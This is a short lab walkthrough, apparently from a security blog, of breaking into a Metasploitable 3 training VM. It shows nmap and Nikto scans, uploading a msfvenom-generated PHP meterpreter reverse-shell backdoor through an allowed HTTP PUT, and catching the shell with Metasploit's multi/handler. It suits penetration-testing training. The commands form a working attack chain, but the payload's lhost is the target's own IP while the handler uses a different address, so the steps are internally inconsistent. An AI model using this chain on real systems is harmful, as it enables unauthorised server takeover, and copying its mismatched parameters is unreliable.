@@ -1,0 +1,43 @@
+
+Manual Penetration Testing in Metasploitable 3
+
+Target: Metasploitable 3
+Attacker: Kali Linux
+Scan the target IP to know the Open ports for running services. I am using nmap command for scanning the target PC. Type the following command on terminal in kali Linux.
+nmap –p-  192.168.1.14
+As you can see it is showing multiple unknown open ports but we are not able to find running services on target IP.
+
+Open target IP on browser with one of unknown port 8585 as 192.168.1.14:8585
+
+Under this URL I have got directories like upload and word press lets penetrate inside it. Again type following URL on browser.
+192.168.1.14:8585/uploads/
+Now we are inside the upload directory but it is showing nothing special.
+
+Since Nmap is fail to give complete detail about open ports therefore now I will scan again the target IP using NIKTO with open port for upload directory hence type following command on terminal
+Nikto –h http://192.168.1.14:8585/uploads/
+It’ll scan multiple ports on a server and checks for server configuration items such as the presence of multiple index files, HTTP server options.
+it is showing that in upload directory HTTP method PUT allows client to save files on the web server which means I can upload a file on server and this stage could became the part of attack by uploading a malicious file as backdoor in web server.
+
+Install poster plug-in from Firefox add-on. As poster let you perform HTTP request with parameters like: GET, POST, PUT and DELETE. 
+
+Prepare the malicious file that you would upload with msfvenom :
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.14 lport=4444 -f raw
+ Copy the code from <?php to die() and save it in a file with .php extension. I had save the backdoor as shel.php on desktop and will later browser this file through poster to upload on webserver.
+
+Click on the tools from the menu bar. And then click on Poster from the drop down menu.
+
+A following dialog box will open. Here, browse the file that you will upload and click on PUT option. This exploring will show you that PUT is allowed that means you can upload through it
+
+It will show you that the file is uploaded and displays complete results including headers.
+
+And you can see the same on your browser that you file will be uploaded (as in our case the file is shel.php)
+
+Simultaneously, open metasploit and use multi/handler:
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.12
+set lport 4444
+exploit
+After hitting enter button on your keyboard, run the file you just uploaded. It will give you a meterpreter session.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
